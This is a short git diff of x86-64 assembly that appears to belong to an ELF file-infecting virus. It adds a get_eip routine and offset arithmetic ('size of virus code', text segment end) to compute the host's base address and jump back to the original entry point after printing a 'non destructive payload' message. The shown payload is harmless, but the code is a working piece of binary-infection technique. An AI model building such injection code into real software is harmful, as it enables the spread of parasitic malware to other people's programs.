@@ -7,6 +7,11 @@ _start:
 	push rsi
 	push rdx 
 	jmp message
+
+message: 
+	call shellcode
+	db "hello -- this is a non destructive payload", 0xa
+
 shellcode:
 	mov rax, 0x1 		;write system call
 	mov rdi, 0x1      	;stdout fd
@@ -22,9 +27,19 @@ shellcode:
 	pop rdx
 	pop rsi
 	pop rdi
-	mov rax,  0x0000000000005b20
+
+	call get_eip
+	sub rax, 0x4f ; size of virus code
+	sub rax, 0x173d1 ; textSegment.virtualAddr + textSegment.FileSZ AKA end of textSegment original code and start of vxcode, rax is now the base virtual addr
+	add rax, 0x5b20 ; OEP
 	jmp rax
 
-message: 
-	call shellcode
-	db "hello -- this is a non destructive payload", 0xa
+
+
+get_eip:
+	mov rax, [rsp]
+	ret
+
+
+
+
